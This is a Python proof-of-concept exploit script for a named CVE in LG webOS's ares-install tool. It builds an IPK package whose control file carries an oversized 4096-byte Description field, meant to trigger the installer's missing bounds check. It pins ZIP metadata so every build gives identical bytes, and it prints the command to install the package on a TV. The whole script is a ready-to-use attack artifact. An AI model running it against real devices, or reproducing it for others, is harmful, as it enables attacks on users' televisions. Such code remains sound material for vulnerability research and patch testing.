#!/usr/bin/env python3
"""CVE-2023-42790 — LG webOS ares-install. IPK with a malformed control file
that the installer trusts without bounds checks."""
import sys, io, zipfile
from pathlib import Path

CONTROL = (b"Package: org.evil.poc\nVersion: 1.0.0\n"
           b"Architecture: all\nMaintainer: poc\nDescription: " + b"A" * 4096 + b"\n")

# Fixed ZIP entry timestamp: writestr() stamps current time by default,
# which would make every build byte-different (manifest drift).
_EPOCH = (1980, 1, 1, 0, 0, 0)

def _writestr(z, name: str, data: bytes):
    info = zipfile.ZipInfo(name, date_time=_EPOCH)
    # Stored, not deflated: the deflate output depends on the zlib build
    # (classic zlib vs zlib-ng disagree byte-for-byte), so a compressed
    # archive hashes differently on CI than on a dev box and the payload
    # manifest drifts. ZIP_STORED keeps the bytes identical everywhere.
    info.compress_type = zipfile.ZIP_STORED
    # Pin the "version made by" host field: ZipInfo defaults it to 0 on
    # Windows and 3 on Unix, so the same build produced different bytes
    # per OS and the payload manifest drifted between CI and local.
    info.create_system = 0
    z.writestr(info, data)

def build() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        _writestr(z, "control", CONTROL)
        _writestr(z, "appinfo.json", b'{"id":"org.evil.poc","version":"1.0.0","main":"index.html"}')
        _writestr(z, "index.html", b"<html><body>poc</body></html>")
    return buf.getvalue()

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-42790.ipk")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2023-42790 IPK -> {out} ({len(d)} bytes)")
    print(f"    install: ares-install --device tv {out}")

if __name__ == "__main__":
    main()
